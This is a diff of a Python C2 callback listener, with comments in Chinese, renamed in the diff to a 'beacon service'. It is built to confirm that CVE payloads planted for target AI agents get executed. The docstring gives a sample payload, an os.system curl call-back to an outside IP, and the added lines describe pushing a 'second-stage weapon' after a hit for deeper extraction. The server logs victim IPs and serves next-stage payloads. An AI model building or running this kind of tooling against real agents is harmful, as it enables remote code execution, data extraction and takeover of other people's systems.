@@ -1,13 +1,14 @@
 """
-C2 Beacon 监听器 — 验证 L3 CVE 武器化是否真正生效
+信标服务 (旧称 C2 监听器) — 验证 L3 CVE 武器化是否真正生效
 
 监听端口: 0.0.0.0:9999（或 127.0.0.1:9999）
 接收: payload 中植入的 curl/wget/python 回连请求
 
 实验原理:
 - L3 反制生成 CVE payload（如 __import__('os').system('curl http://10.99.1.50:9999/beacon')）
-- 如果靶标 Agent 真的执行了 payload，会发送 HTTP 请求到本监听器
-- 监听器记录来源 IP、时间、payload 中的数据 = 证明反制成功
+- 如果靶标 Agent 真的执行了 payload，会发送 HTTP 请求到本服务
+- 服务记录来源 IP、时间、payload 中的数据 = 证明反制成功
+- 命中后下发二阶段武器 (deep stage): 开口子后的深层次索取
 """
 
 import asyncio
@@ -30,10 +31,10 @@ class BeaconRecord:
     beacon_id: str = ""
 
 
-class C2Listener:
-    """C2 Beacon 监听器 — 单例，异步运行"""
+class BeaconService:
+    """信标服务 — 单例，异步运行。agent 被载体引导来回连确认, 命中下发二阶段武器"""
 
-    LOG_PATH = Path("experiments/c2_beacons.jsonl")
+    LOG_PATH = Path("experiments/beacon_hits.jsonl")
 
     def __init__(self, host: str = "0.0.0.0", port: int = 9999, on_beacon=None,
                  next_stage_payload: dict = None):
@@ -105,7 +106,7 @@ class C2Listener:
         await writer.drain()
         writer.close()
 
-        print(f"[C2] BEACON from {client_ip} | {method} {path} | total={len(self.beacons)}")
+        print(f"[BEACON] hit from {client_ip} | {method} {path} | total={len(self.beacons)}")
         if self.on_beacon:
             try:
                 self.on_beacon(beacon)
@@ -127,15 +128,15 @@ class C2Listener:
             }, ensure_ascii=False) + "\n")
 
     async def start(self):
-        """启动监听器"""
+        """启动信标服务"""
         self.server = await asyncio.start_server(self._handle, self.host, self.port)
         self._running = True
-        print(f"[C2] Listener started on {self.host}:{self.port}")
+        print(f"[BEACON] 信标服务 started on {self.host}:{self.port}")
         async with self.server:
             await self.server.serve_forever()
 
     def stop(self):
-        """停止监听器"""
+        """停止信标服务"""
         if self.server:
             self.server.close()
         self._running = False
@@ -149,15 +150,15 @@ class C2Listener:
         }
 
 
-async def run_c2_listener(port: int = 9999):
-    """独立运行 C2 监听器"""
-    listener = C2Listener(port=port)
+async def run_beacon_service(port: int = 9999):
+    """独立运行信标服务"""
+    listener = BeaconService(port=port)
     try:
         await listener.start()
     except KeyboardInterrupt:
         listener.stop()
-        print(f"[C2] Stopped. Total beacons: {len(listener.beacons)}")
+        print(f"[BEACON] Stopped. Total beacons: {len(listener.beacons)}")
 
 
 if __name__ == "__main__":
-    asyncio.run(run_c2_listener())
+    asyncio.run(run_beacon_service())
